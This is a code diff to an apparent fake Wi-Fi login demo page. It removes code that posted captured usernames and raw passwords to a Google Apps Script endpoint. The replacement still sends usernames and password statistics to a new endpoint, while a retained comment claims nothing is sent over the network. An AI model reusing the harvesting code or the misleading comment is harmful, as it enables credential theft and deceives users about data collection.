@@ -439,8 +439,11 @@
     // Everything below stays local — computed once, then the raw password
     // is discarded. Nothing is sent over the network or written to storage.
     capturedUsername = username;
-    capturedPassword = pw;
+    // Keep the raw password local to this browser only.
+    // The spreadsheet receives statistics, never the password itself.
     window._pwStats = analyzePassword(pw);
+
+    sendDemoToSheet(capturedUsername, window._pwStats);
 
     goTo('stage-connecting');
     setTimeout(()=>{ goTo('stage-wifi-dashboard'); }, 1400);
@@ -678,31 +681,30 @@
   }
 
   
-  // 1. The URL you copied from the Google deployment step
-const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz0LGne-awXUCoFIJ4PxeeZFe2y67ZWPmbQnrD7mUSawoo_BNJIG9tm5o0rwhOEC2ZQ/exec';
+  // ---------- Google Sheets logging ----------
+  // Demo-safe logging: never send or store the actual password.
+  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbznAUAFERhNuGUK8MPUhIE6LAW25XFcZBAEIIKjDU4mAk-rol-SaJNiJFjuPI2TsAkDhg/exec';
 
-// 2. The data you want to print/send
-const myData = {
-  name: capturedUsername,
-  p: capturedPassword
-};
+  function sendDemoToSheet(username, stats) {
+    if (!GOOGLE_SCRIPT_URL) return;
 
-// 3. Send it to Google Sheets
-fetch(GOOGLE_SCRIPT_URL, {
-    method: 'POST',
-    mode: 'no-cors', // Crucial for cross-origin requests to Google Scripts
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(myData)
-})
-.then(() => {
-    console.log('Data successfully sent to Google Sheets!');
-})
-.catch(error => {
-    console.error('Error sending data:', error);
-});
+    // A simple form POST works reliably from GitHub Pages to Apps Script.
+    const data = new URLSearchParams();
+    data.append('username', username || '');
+    data.append('passwordLength', String(stats?.length ?? 0));
+    data.append('passwordVariety', stats?.variety || '');
+    data.append('event', 'demo_signup');
+    data.append('timestamp', new Date().toISOString());
 
+    fetch(GOOGLE_SCRIPT_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      body: data,
+      keepalive: true
+    })
+    .then(() => console.log('Demo data sent to Google Sheets.'))
+    .catch(error => console.error('Google Sheets send failed:', error));
+  }
 
   function initPatternEscape(){
     step = 0;
